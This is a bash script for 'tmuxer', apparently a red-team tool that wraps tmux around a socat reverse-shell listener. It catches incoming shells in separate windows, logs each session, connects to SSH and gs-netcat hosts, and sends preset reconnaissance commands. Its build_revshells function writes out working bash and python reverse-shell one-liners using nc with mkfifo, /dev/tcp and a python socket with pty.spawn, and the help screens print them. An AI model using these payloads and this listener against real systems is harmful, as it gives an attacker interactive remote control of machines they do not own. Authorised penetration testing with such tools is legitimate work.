#!/usr/bin/env bash

# ── defaults ──────────────────────────────────────────────────────────────────
PORT=""
LOGDIR="$HOME/tmuxer-logs"
PREPEND_SPACE=1
ORIG_ARGS=("$@")
SELF="$(cd "$(dirname "$0")" || exit; pwd)/$(basename "$0")"
LISTENER_PID_FILE="/tmp/tmuxer_listener.pid"

GSOCKET_HOSTS="$HOME/.gsocket/hosts"

# Config-sourced variables
listener_port=""
logdir=""
gsocket_hosts=""

# Host / command data
declare -a SSH_HOSTS
declare -a GS_ENTRIES  # "name|description|secret"
declare -a CMD_NAMES
declare -a CMD_VALUES

# Temp files (set at startup)
HOSTS_FILE=""
CMDS_FILE=""
F1_SCRIPT=""
F2_SCRIPT=""
F5_SCRIPT=""
F9_SCRIPT=""
HELP_FILE=""
LISTENER_INFO_FILE=""
CTRLC_SCRIPT=""

# ── usage ─────────────────────────────────────────────────────────────────────
usage() {
  cat <<EOF
Usage: $(basename "$0") [OPTIONS] [port]

Options:
  -p, --port <port>       Port to listen on (overrides ~/.tmuxer.conf)
  --logdir <dir>          Log directory (default: ~/tmuxer-logs)
  --prepend-space         Prepend commands with a space (default: on)
  --no-prepend-space      Do not prepend commands with a space
  --install               Install as 'tmuxer' symlink in /usr/local/bin

Config: ~/.tmuxer.conf (shell-sourceable)
  listener_port=4444
  logdir=~/tmuxer-logs
  prepend_space=1
  cmd_1_name="Quick Recon"
  cmd_1="id; uname -a; hostname"
  cmd_2_name="Full Recon"
  cmd_2="id; uname -a; w; netstat -tulip; ip a; arp -a; ip r; ps ax"

Host sources:
  ~/.ssh/config             — SSH Host entries
  \$GSOCKET_HOSTS (default ~/.gsocket/hosts) — name|description|secret
EOF
  exit 0
}

install() {
  # Create default config if missing (no root needed)
  local conf="$HOME/.tmuxer.conf"
  if [[ ! -f "$conf" ]]; then
    cat > "$conf" <<'CONFEOF'
# tmuxer config — shell-sourceable
listener_port=4444
logdir=$HOME/tmuxer-logs
prepend_space=1
gsocket_hosts=$HOME/.gsocket/hosts

cmd_1_name="Quick Recon"
cmd_1="id; uname -a; hostname"

cmd_2_name="Full Recon"
cmd_2="id; uname -a; w; netstat -tulip; ip a; arp -a; ip r; ps ax"
CONFEOF
    echo "created $conf"
  else
    echo "config exists: $conf"
  fi

  # Create default gsocket hosts if missing
  local gs="${gsocket_hosts:-$HOME/.gsocket/hosts}"
  local gsdir
  gsdir="$(dirname "$gs")"
  mkdir -p "$gsdir" 2>/dev/null
  if [[ ! -f "$gs" ]]; then
    cat > "$gs" <<'GSEOF'
# GSocket hosts — one entry per line, pipe-delimited
# Format: name|description|secret
#
# Example:
#   my-box|home desktop|mysecretkey
GSEOF
    chmod 600 "$gs"
    echo "created $gs"
  else
    echo "gsocket hosts exists: $gs"
  fi

  # Install symlink (may need sudo)
  local dest=/usr/local/bin/tmuxer
  if [[ -e "$dest" ]] || [[ -L "$dest" ]]; then
    rm -f "$dest" 2>/dev/null || true
  fi
  if ln -s "$SELF" "$dest" 2>/dev/null; then
    echo "installed: $dest -> $SELF"
  else
    echo "note: config files created, but symlink needs sudo:"
    echo "      sudo $0 --install"
  fi
  exit 0
}

# ── config loading ────────────────────────────────────────────────────────────
load_config() {
  local config_file="$HOME/.tmuxer.conf"
  if [[ -f "$config_file" ]]; then
    source "$config_file"
  fi
  LOGDIR="${logdir:-$LOGDIR}"
  PREPEND_SPACE="${prepend_space:-$PREPEND_SPACE}"
  GSOCKET_HOSTS="${gsocket_hosts:-$GSOCKET_HOSTS}"
  if [[ -z "$PORT" ]] && [[ -n "$listener_port" ]]; then
    PORT="$listener_port"
  fi
}

parse_commands() {
  CMD_NAMES=()
  CMD_VALUES=()
  local i=1 name val
  while true; do
    name="cmd_${i}_name"
    val="cmd_${i}"
    [[ -z "${!name:-}" ]] && break
    CMD_NAMES+=("${!name}")
    CMD_VALUES+=("${!val:-}")
    ((i++))
  done
}

# ── SSH config parsing ────────────────────────────────────────────────────────
parse_ssh_config_file() {
  local file="$1" line in_match=0 h
  [[ -f "$file" ]] || return
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" || "$line" == \#* ]] && continue
    if [[ "$line" =~ ^[Mm]atch[[:space:]] ]]; then in_match=1; continue; fi
    if [[ $in_match -eq 1 ]]; then
      [[ "$line" =~ ^[Hh]ost[[:space:]] ]] && in_match=0
      [[ $in_match -eq 1 ]] && continue
    fi
    if [[ "$line" =~ ^[Ii]nclude[[:space:]]+(.+)$ ]]; then
      local pat="${BASH_REMATCH[1]}"
      pat="${pat//\~/$HOME}"
      for inc in $pat; do parse_ssh_config_file "$inc"; done
      continue
    fi
    if [[ "$line" =~ ^[Hh]ost[[:space:]]+(.+)$ ]]; then
      for h in ${BASH_REMATCH[1]}; do
        [[ "$h" == *\** || "$h" == *\?* || "$h" == *!* ]] && continue
        SSH_HOSTS+=("$h")
      done
    fi
  done < "$file"
}

parse_ssh_config() {
  SSH_HOSTS=()
  parse_ssh_config_file "$HOME/.ssh/config"
}

# ── GSocket hosts parsing ─────────────────────────────────────────────────────
parse_gsocket_hosts() {
  GS_ENTRIES=()
  local file="$GSOCKET_HOSTS" line name rest description secret
  [[ -f "$file" ]] || return 0
  # Require 600 permissions
  local perms
  perms=$(stat -c '%a' "$file" 2>/dev/null || stat -f '%Lp' "$file" 2>/dev/null)
  if [[ "$perms" != "600" ]]; then
    echo "error: $file must have mode 600 (current: $perms)"
    echo "       run: chmod 600 $file"
    exit 1
  fi
  while IFS= read -r line || [[ -n "$line" ]]; do
    line="${line#"${line%%[![:space:]]*}"}"
    line="${line%"${line##*[![:space:]]}"}"
    [[ -z "$line" || "$line" == \#* ]] && continue
    name="${line%%|*}"
    rest="${line#*|}"
    description="${rest%%|*}"
    secret="${rest#*|}"
    [[ -z "$name" || -z "$secret" ]] && continue
    GS_ENTRIES+=("$name|$description|$secret")
  done < "$file"
}

# ── reverse shells ────────────────────────────────────────────────────────────
build_revshells() {
  local ip
  ip=$(ip route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="src"){print $(i+1);exit}}')
  ip=${ip:-$(hostname -I 2>/dev/null | awk '{print $1}')}
  ip=${ip:-"<your-ip>"}
  REVSHELL_BASH="H=$ip;P=$PORT;NC=\$(type -P nc||type -P ncat);if [ -n \"\$NC\" ];then F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;else bash -i >/dev/tcp/\$H/\$P 0>&1 2>&1;fi"
  REVSHELL_PYTHON="H=$ip;P=$PORT;PY=\$(type -P python3 2>/dev/null||type -P python 2>/dev/null);if [ -n \"\$PY\" ];then \$PY -c \"import socket,os,pty;s=socket.socket();s.connect(('\$H',\$P));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn('/bin/bash')\";else NC=\$(type -P nc||type -P ncat);F=\$(mktemp);rm \$F;mkfifo \$F;cat \$F|sh -i 2>&1|\$NC \$H \$P >\$F;fi"
}

# ── tmux setup ────────────────────────────────────────────────────────────────
enforce_tmux() {
  if [[ -n "$TMUX" ]] && [[ -z "$TMUXER_OWNED_SESSION" ]]; then
    echo "error: refusing to run inside an existing tmux session"
    echo "       run from a plain terminal instead"
    exit 1
  fi
  if [[ -z "$TMUX" ]]; then
    exec tmux new-session -e TMUXER_OWNED_SESSION=1 -- "$0" "${ORIG_ARGS[@]}"
  fi
}

apply_tmux_settings() {
  tmux set-option -g history-limit 100000
  tmux set-option -g mouse on
  tmux set-window-option -g mode-keys vi
  tmux set-option -g escape-time 10
  tmux set-option -g monitor-activity on
  tmux set-option -g visual-activity off
  tmux set-option -g window-status-activity-style 'fg=black,bg=yellow,bold'
  tmux set-option -g status-right "F9→listen | %H:%M"
}

# ── scripts & data files ──────────────────────────────────────────────────────
build_scripts() {
  local fzf_bin
  fzf_bin="$(type -P fzf 2>/dev/null)" || fzf_bin=""

  # ── HELP / LISTENER static content ─────────────────────────────────────────
  HELP_FILE=$(mktemp /tmp/tmuxer_help_XXXXXX)
  cat > "$HELP_FILE" <<'HELPEOF'
┌─ tmuxer shortcuts ───────────────────────────────────────────────────────────┐
│  F1   show this help                                                         │
│  F2   host connector (SSH + GSocket) — type to filter, Enter to connect      │
│  F3   toggle raw mode (pty.spawn connections)                                │
│  F5   send commands (config-defined) — type to filter, Enter to send         │
│  F9   toggle reverse shell listener on/off                                   │
├───────────────────────────────────────────────────────────────────────────────┤
│  Mouse     scroll to enter copy mode · click to focus pane                   │
│  Vi keys   in copy mode: hjkl move · Space start sel · Enter copy · q quit   │
│  Paste     Ctrl-b ]                                                          │
│  Windows   Ctrl-b c new · Ctrl-b n/p next/prev · Ctrl-b & kill              │
│  Activity  inactive windows turn yellow in the status bar on new output      │
└──────────────────────────────────────────────────────────────────────────────┘
HELPEOF
  {
    printf '\nReverse shells (listener on :%s):\n' "$PORT"
    printf '  [bash]   %s\n' "$REVSHELL_BASH"
    printf '  [python] %s\n' "$REVSHELL_PYTHON"
  } >> "$HELP_FILE"

  LISTENER_INFO_FILE=$(mktemp /tmp/tmuxer_listener_info_XXXXXX)
  cat > "$LISTENER_INFO_FILE" <<'INFOEOF'
┌─ tmuxer listener ───────────────────────────────────────────────────────────┐
│  F1   full help & shortcuts                                                 │
│  F2   host connector (SSH + GSocket)                                        │
│  F3   toggle raw mode (pty.spawn connections)                                │
│  F5   send commands to active connection                                     │
│  F9   stop this listener                                                     │
├──────────────────────────────────────────────────────────────────────────────┤
│  Mouse     scroll to enter copy mode · click to focus pane                   │
│  Vi keys   in copy mode: hjkl move · Space start sel · Enter copy · q quit   │
│  Paste     Ctrl-b ]                                                          │
│  Windows   Ctrl-b c new · Ctrl-b n/p next/prev · Ctrl-b & kill              │
│  Activity  inactive windows turn yellow in the status bar on new output      │
└──────────────────────────────────────────────────────────────────────────────┘
INFOEOF
  {
    printf '\nReverse shells (listener on :%s):\n' "$PORT"
    printf '  [bash]   %s\n' "$REVSHELL_BASH"
    printf '  [python] %s\n' "$REVSHELL_PYTHON"
    printf '\n[*] Waiting for connections...\n'
  } >> "$LISTENER_INFO_FILE"

  # ── F1: help popup (Enter to close) ───────────────────────────────────────
  F1_SCRIPT=$(mktemp /tmp/tmuxer_f1_XXXXXX)
  cat > "$F1_SCRIPT" <<F1EOF
#!/usr/bin/env bash
cat "$HELP_FILE"
printf '\nPress Enter to close...'
head -n 1 >/dev/null
F1EOF
  chmod +x "$F1_SCRIPT"

  # ── F2: host connector ────────────────────────────────────────────────────
  F2_SCRIPT=$(mktemp /tmp/tmuxer_f2_XXXXXX)
  if [[ -n "$fzf_bin" ]]; then
    cat > "$F2_SCRIPT" <<F2EOF
#!/usr/bin/env bash
hosts="$HOSTS_FILE"
[[ -s "\$hosts" ]] || { echo "No hosts found."; echo "Sources: ~/.ssh/config ~/.gsocket/hosts"; printf '\\nPress Enter...'; head -n 1 >/dev/null; exit 0; }
sel=\$(awk -F'|' '{print \$1}' "\$hosts" | fzf --color=dark --header='Hosts (type to filter, Enter=connect, Esc=cancel)' --height=20 --border)
[[ -z "\$sel" ]] && exit 0
action=\$(grep -m1 -F "\$sel|" "\$hosts" | cut -d'|' -f2)
type="\${action%%:*}"
rest="\${action#*:}"
case "\$type" in
  SSH)
    tmux display-message "Connecting to \$rest..."
    tmux new-window -n "\$rest" "ssh \$rest"
    ;;
  GS)
    gs_name="\${rest%%|*}"
    gs_rest="\${rest#*|}"
    gs_desc="\${gs_rest%%|*}"
    gs_secret="\${gs_rest#*|}"
    tmux display-message "Connecting to GS: \$gs_name..."
    tmux new-window -n "\$gs_name" "gs-netcat -s '\$gs_secret' -i"
    ;;
esac
F2EOF
  else
    # Fallback: build display-menu + case inline (no read-in-popup issues)
    cat > "$F2_SCRIPT" <<'F2EOF'
#!/usr/bin/env bash
[[ -s "$1" ]] || { echo "No hosts found."; printf '\nPress Enter...'; head -n 1 >/dev/null; exit 0; }
# The case body is appended below by build_scripts
F2EOF
    # Generate case entries from the hosts file
    local keys=(a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0)
    local i=0
    {
      printf 'choice=$(tmux display-menu -T "Hosts" \'
      while IFS='|' read -r display action; do
        [[ -z "$display" ]] && continue
        local key="${keys[$i]}"
        [[ -z "$key" ]] && break
        printf '  %q %q ""' "$display" "$key"
        ((i++))
      done < "$HOSTS_FILE"
      printf ')\n'
      printf 'case "$choice" in\n'
      i=0
      while IFS='|' read -r display action; do
        [[ -z "$display" ]] && continue
        local key="${keys[$i]}"
        [[ -z "$key" ]] && break
        local type="${action%%:*}"
        local rest="${action#*:}"
        if [[ "$type" == "SSH" ]]; then
          printf '  %q) tmux new-window -n %q "ssh %s" ;;\n' "$key" "$rest" "$rest"
        else
          local gs_name="${rest%%|*}"
          local gs_rest="${rest#*|}"
          local gs_secret="${gs_rest#*|}"
          printf '  %q) tmux new-window -n %q "gs-netcat -s %s -i" ;;\n' "$key" "$gs_name" "$gs_secret"
        fi
        ((i++))
      done < "$HOSTS_FILE"
      printf 'esac\n'
    } >> "$F2_SCRIPT"
  fi
  chmod +x "$F2_SCRIPT"

  # ── F5: command popup ─────────────────────────────────────────────────────
  F5_SCRIPT=$(mktemp /tmp/tmuxer_f5_XXXXXX)
  if [[ -n "$fzf_bin" ]]; then
    cat > "$F5_SCRIPT" <<F5EOF
#!/usr/bin/env bash
cmds="$CMDS_FILE"
fifo=\$(tmux show-options -wv @out_fifo 2>/dev/null)
[[ -s "\$cmds" ]] || { echo "No commands defined in ~/.tmuxer.conf"; printf '\\nPress Enter...'; head -n 1 >/dev/null; exit 0; }
sel=\$(awk -F'|' '{print \$1}' "\$cmds" | fzf --color=dark --header='Commands (type to filter, Enter=send, Esc=cancel)' --height=20 --border)
[[ -z "\$sel" ]] && exit 0
cmd_val=\$(grep -m1 -F "\$sel|" "\$cmds" | cut -d'|' -f2)
cmd_name="\$sel"
if [[ -p "\$fifo" ]]; then
F5EOF
    if [[ "$PREPEND_SPACE" == "1" ]]; then
      echo '  printf " %s\n" "$cmd_val" >> "$fifo"' >> "$F5_SCRIPT"
    else
      echo '  printf "%s\n" "$cmd_val" >> "$fifo"' >> "$F5_SCRIPT"
    fi
    cat >> "$F5_SCRIPT" <<'F5EOF'
  tmux display-message "Sent: $cmd_name"
else
  tmux display-message "F5: no active connection (no fifo)"
fi
F5EOF
  else
    # Fallback: display-menu + case (no read-in-popup issues)
    cat > "$F5_SCRIPT" <<'F5EOF'
#!/usr/bin/env bash
fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
[[ -p "$fifo" ]] || { tmux display-message "F5: no active connection"; exit 1; }
# The case body is appended below by build_scripts
F5EOF
    local keys=(a b c d e f g h i j k l m n o p q r s t u v w x y z 1 2 3 4 5 6 7 8 9 0)
    local i=0
    {
      printf 'choice=$(tmux display-menu -T "Commands" \'
      while IFS='|' read -r name val; do
        [[ -z "$name" ]] && continue
        local key="${keys[$i]}"
        [[ -z "$key" ]] && break
        printf '  %q %q ""' "$name" "$key"
        ((i++))
      done < "$CMDS_FILE"
      printf ')\n'
      printf 'case "$choice" in\n'
      i=0
      while IFS='|' read -r name val; do
        [[ -z "$name" ]] && continue
        local key="${keys[$i]}"
        [[ -z "$key" ]] && break
        if [[ "$PREPEND_SPACE" == "1" ]]; then
          printf '  %q) printf " %%s\\n" %q >> "$fifo" ;;\n' "$key" "$val"
        else
          printf '  %q) printf "%%s\\n" %q >> "$fifo" ;;\n' "$key" "$val"
        fi
        ((i++))
      done < "$CMDS_FILE"
      printf 'esac\n'
      printf 'tmux display-message "Sent command"\n'
    } >> "$F5_SCRIPT"
  fi
  chmod +x "$F5_SCRIPT"

  # ── F9: listener toggle ───────────────────────────────────────────────────
  F9_SCRIPT=$(mktemp /tmp/tmuxer_f9_XXXXXX)
  cat > "$F9_SCRIPT" <<F9EOF
#!/usr/bin/env bash
pid_file="$LISTENER_PID_FILE"
self="$SELF"
port="$PORT"
logdir="$LOGDIR"
info_file="$LISTENER_INFO_FILE"

if [[ -f "\$pid_file" ]]; then
  pid=\$(head -1 "\$pid_file" 2>/dev/null)
  listener_win=\$(sed -n '2p' "\$pid_file" 2>/dev/null)
  [[ -n "\$pid" ]] && kill "\$pid" 2>/dev/null
  sleep 0.2
  [[ -n "\$pid" ]] && kill -9 "\$pid" 2>/dev/null
  [[ -n "\$listener_win" ]] && tmux kill-window -t "\$listener_win" 2>/dev/null
  rm -f "\$pid_file"
  tmux set-option -g status-right "F9→listen | %H:%M"
  tmux display-message "Listener stopped (:${port})"
  exit 0
fi

# Start listener window
win_id=\$(tmux new-window -P -F "#{window_id}" -n "listener" \
  "cat \$info_file; echo 'Press F9 to stop'; while sleep 3600; do :; done")
sleep 0.3
listener_tty=\$(tmux display-message -p -t "\$win_id" '#{pane_tty}')

export LISTENER_TTY="\$listener_tty"
export LOGDIR="\$logdir"
export INIT_CMDS=""
export PREPEND_SPACE="$PREPEND_SPACE"

socat TCP4-LISTEN:\${port},reuseaddr,fork EXEC:"\$self handler \$logdir",nofork >/dev/null 2>&1 &
socat_pid=\$!
disown
echo "\$socat_pid" > "\$pid_file"
echo "\$win_id" >> "\$pid_file"
tmux set-option -g status-right "LISTEN:\$port | %H:%M"
tmux display-message "Listener started on :\$port"
F9EOF
  chmod +x "$F9_SCRIPT"
}

# ── data files ────────────────────────────────────────────────────────────────
build_data_files() {
  HOSTS_FILE=$(mktemp /tmp/tmuxer_hosts_XXXXXX)
  for h in "${SSH_HOSTS[@]}"; do
    echo "SSH:$h|SSH:$h"
  done >> "$HOSTS_FILE"
  for entry in "${GS_ENTRIES[@]}"; do
    local name="${entry%%|*}"
    local rest="${entry#*|}"
    local description="${rest%%|*}"
    local display="GS: $name ($description)"
    echo "$display|GS:$entry"
  done >> "$HOSTS_FILE"

  CMDS_FILE=$(mktemp /tmp/tmuxer_cmds_XXXXXX)
  for i in "${!CMD_NAMES[@]}"; do
    echo "${CMD_NAMES[$i]}|${CMD_VALUES[$i]}"
  done >> "$CMDS_FILE"
}

# ── keybindings ───────────────────────────────────────────────────────────────
bind_keys() {
  # F1: help popup (Enter to close)
  tmux bind-key -n F1 display-popup -E -w 90% -h 90% "$F1_SCRIPT"

  # F2: host connector popup
  tmux bind-key -n F2 display-popup -E -w 80% -h 80% "$F2_SCRIPT"

  # F3: raw mode toggle
  tmux bind-key -n F3 if-shell -F '#{==:#{@raw_mode},1}' \
    'run-shell "stty sane < #{pane_tty}"; set-option -w @raw_mode 0; display-message "raw mode OFF — cooked restored"' \
    'run-shell "stty raw -echo < #{pane_tty}"; set-option -w @raw_mode 1; display-message "raw mode ON — pty.spawn active"'

  # F5: command popup
  tmux bind-key -n F5 display-popup -E -w 80% -h 80% "$F5_SCRIPT"

  # F9: listener toggle (background — non-blocking)
  tmux bind-key -n F9 run-shell -b "$F9_SCRIPT"

  # Ctrl-c
  CTRLC_SCRIPT=$(mktemp /tmp/tmuxer_ctrlc_XXXXXX)
  cat > "$CTRLC_SCRIPT" <<'CTRLC'
#!/usr/bin/env bash
fifo=$(tmux show-options -wv @out_fifo 2>/dev/null)
[[ -p "$fifo" ]] && printf '\003' >> "$fifo"
CTRLC
  chmod +x "$CTRLC_SCRIPT"

  tmux bind-key -n C-c if-shell -F '#{==:#{window_index},0}' \
    'send-keys C-c' \
    "if-shell -F '#{==:#{@raw_mode},1}' \
      'run-shell \"$CTRLC_SCRIPT\"' \
      'confirm-before -p \"Ctrl-C → remote? (y/n)\" \"run-shell \\\"$CTRLC_SCRIPT\\\"\"'"

  # Cleanup hook
  tmux set-hook session-closed "run-shell 'rm -f $LISTENER_PID_FILE $HOSTS_FILE $CMDS_FILE $HELP_FILE $LISTENER_INFO_FILE $F1_SCRIPT $F2_SCRIPT $F5_SCRIPT $F9_SCRIPT $CTRLC_SCRIPT; kill \$(cat $LISTENER_PID_FILE 2>/dev/null) 2>/dev/null'"
}

# ── connection handler ────────────────────────────────────────────────────────
handle_connection() {
  local remote_ip="${SOCAT_PEERADDR:-unknown}"
  local in out logfile win_id new_pane_tty in_pid out_pid

  echo "[+] incoming connection from $remote_ip" >"$LISTENER_TTY"

  in=$(mktemp -u /tmp/sock_in_XXXXXX)
  out=$(mktemp -u /tmp/sock_out_XXXXXX)
  mkfifo "$in" "$out"

  if [[ -n "$LOGDIR" ]]; then
    mkdir -p "$LOGDIR"
    logfile="$LOGDIR/${remote_ip}-$(date +%d%m%y-%H%M%S).log"
    touch "$logfile"
  fi

  local probe_cmd="[ -t 0 ] && echo __PTY__ || echo __NOPTY__"
  [[ "$PREPEND_SPACE" == "1" ]] && printf ' %s\n' "$probe_cmd" || printf '%s\n' "$probe_cmd"

  win_id=$(tmux new-window -P -F "#{window_id}" -n "$remote_ip" \
    "echo '[*] connection from $remote_ip — [F5] commands'; echo '[F3] raw mode toggle'; trap 'stty sane; rm -f $in $out' EXIT; cat <$in & cat >$out; wait")

  tmux set-option -w -t "$win_id" @out_fifo "$out"
  sleep 0.1
  new_pane_tty=$(tmux display-message -p -t "$win_id" "#{pane_tty}")

  local pty_detected=0 probe_buf="" probe_line probe_start=$SECONDS
  while IFS= read -r -t 1 probe_line <&0 2>/dev/null; do
    [[ "$probe_line" == *"__PTY__"* ]]   && { pty_detected=1; break; }
    [[ "$probe_line" == *"__NOPTY__"* ]] && break
    probe_buf+="$probe_line"$'\n'
    [[ $((SECONDS - probe_start)) -ge 3 ]] && break
  done

  if [[ $pty_detected -eq 1 ]]; then
    tmux set-option -w -t "$win_id" @raw_mode 1
    stty raw -echo < "$new_pane_tty"
    echo "[*] PTY detected on $remote_ip — raw mode enabled" >"$LISTENER_TTY"
    printf '[*] PTY detected — raw mode ON (F3 to toggle)\n' >"$new_pane_tty"
  else
    printf '[*] No PTY — use pty.spawn + F3 to upgrade\n' >"$new_pane_tty"
  fi

  if [[ -n "$logfile" ]]; then
    { printf '%s' "$probe_buf"; cat <&0; } \
      | tee >(while IFS= read -r line; do printf '%s REMOTE: %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >"$in" &
  else
    { printf '%s' "$probe_buf"; cat <&0; } >"$in" &
  fi
  in_pid=$!

  if [[ -n "$logfile" ]]; then
    cat <"$out" | tee >(while IFS= read -r line; do printf '%s USER:   %s\n' "$(date '+%H:%M:%S')" "$line"; done >>"$logfile") >&1 &
  else
    cat <"$out" >&1 &
  fi
  out_pid=$!

  wait -n $in_pid $out_pid
  kill $in_pid $out_pid 2>/dev/null

  echo "[!] connection from $remote_ip closed" >"$LISTENER_TTY"
  echo "[!] connection closed" >"$new_pane_tty"
  [[ -n "$logfile" ]] && echo "[*] log saved to $logfile" >"$LISTENER_TTY"

  rm -f "$in" "$out"
}

# ── startup ───────────────────────────────────────────────────────────────────
start_tmuxer() {
  load_config
  parse_commands
  parse_ssh_config
  parse_gsocket_hosts

  if [[ -z "$PORT" ]]; then
    echo "error: no port specified"
    echo "       set listener_port in ~/.tmuxer.conf or use --port"
    exit 1
  fi

  build_revshells
  build_data_files
  build_scripts

  enforce_tmux
  apply_tmux_settings
  bind_keys

  tmux rename-window "local" 2>/dev/null

  mkdir -p "$LOGDIR"
  local_log="$LOGDIR/local-$(date +%d%m%y-%H%M%S).log"

  echo "[*] tmuxer ready — port :$PORT — F1 help | F9 listen"
  [[ -n "$LOGDIR" ]] && echo "[*] this session logging to $local_log"

  if command -v script &>/dev/null; then
    if script /dev/null -c true >/dev/null 2>&1; then
      exec script "$local_log" -c bash 2>/dev/null
    else
      exec script -q "$local_log" bash 2>/dev/null
    fi
    echo "script exec failed, log: $local_log" >> /tmp/tmuxer_script_err.log
    exec bash
  else
    exec bash
  fi
}

# ── parse CLI args ────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
  -h | --help)   usage ;;
  --install)     install ;;
  handler)
    MODE=handler
    shift
    LOGDIR="${1:-}"
    shift
    ;;
  --logdir)            LOGDIR="$2";               shift 2 ;;
  --no-prepend-space)  PREPEND_SPACE=0;           shift   ;;
  --prepend-space)     PREPEND_SPACE=1;           shift   ;;
  --port | -p)         PORT="$2";                 shift 2 ;;
  *)             PORT="$1";                      shift   ;;
  esac
done

# ── dispatch ──────────────────────────────────────────────────────────────────
if [[ "$MODE" == "handler" ]]; then
  handle_connection
else
  export LOGDIR
  export PREPEND_SPACE
  start_tmuxer
fi
